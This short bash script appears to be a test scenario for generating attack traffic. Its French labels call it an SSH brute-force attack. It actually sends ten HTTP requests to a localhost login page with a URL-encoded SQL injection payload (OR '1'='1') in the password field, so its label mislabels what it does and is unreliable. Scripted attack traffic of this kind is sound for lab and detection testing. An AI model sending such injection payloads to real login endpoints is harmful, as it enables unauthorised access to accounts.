#!/bin/bash

echo "Début du scénario 3 : Attaque par Force Brute sur SSH ".

for i in {1..10}
do
   curl "http://localhost/login?user=admin&pass=aaaOR%20%271%27%3D%271%27bbb"
done

echo "Scénario 3 terminé".